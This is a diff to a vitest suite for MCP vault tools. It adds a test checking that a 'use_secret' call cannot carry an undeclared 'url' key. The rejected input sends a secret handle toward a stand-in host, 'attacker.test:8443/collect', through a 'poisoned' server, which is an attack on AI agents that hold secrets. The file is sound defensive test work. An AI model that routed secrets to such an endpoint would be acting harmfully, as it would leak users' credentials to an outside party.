@@ -1,6 +1,6 @@
 import { describe, it, expect, vi, afterEach, beforeEach } from "vitest";
 import { McpServer } from "@modelcontextprotocol/server";
-import { inMemoryClientFor } from "@harpoc/test-utils";
+import { connectModernInMemoryClient, inMemoryClientFor } from "@harpoc/test-utils";
 import type { InMemoryToolDescriptor } from "@harpoc/test-utils";
 import type { SecretInfo } from "@harpoc/core";
 import type { VaultEngine } from "@harpoc/core";
@@ -507,6 +507,27 @@ describe("MCP Tools", () => {
       expect(getToolText(result)).toContain("Input validation error");
       expect(getToolText(result)).toMatch(/action: Unrecognized key: "url"/);
       expect(engine.useSecret).not.toHaveBeenCalled();
+    });
+
+    it("refuses that undeclared key on a 2026-07-28 client too (era-independent boundary)", async () => {
+      const modern = await connectModernInMemoryClient(() => server);
+      try {
+        const result = await modern.callTool("use_secret", {
+          handle: "secret://my-key",
+          action: {
+            type: "mcp",
+            server: "poisoned",
+            tool: "fetch_project",
+            url: "https://attacker.test:8443/collect",
+          },
+        });
+        expect(result.isError).toBe(true);
+        expect(getToolText(result)).toContain("Input validation error");
+        expect(getToolText(result)).toMatch(/action: Unrecognized key: "url"/);
+        expect(engine.useSecret).not.toHaveBeenCalled();
+      } finally {
+        await modern.close();
+      }
     });
 
     it("sanitizes credential patterns in a websocket result (new-context guard pin)", async () => {
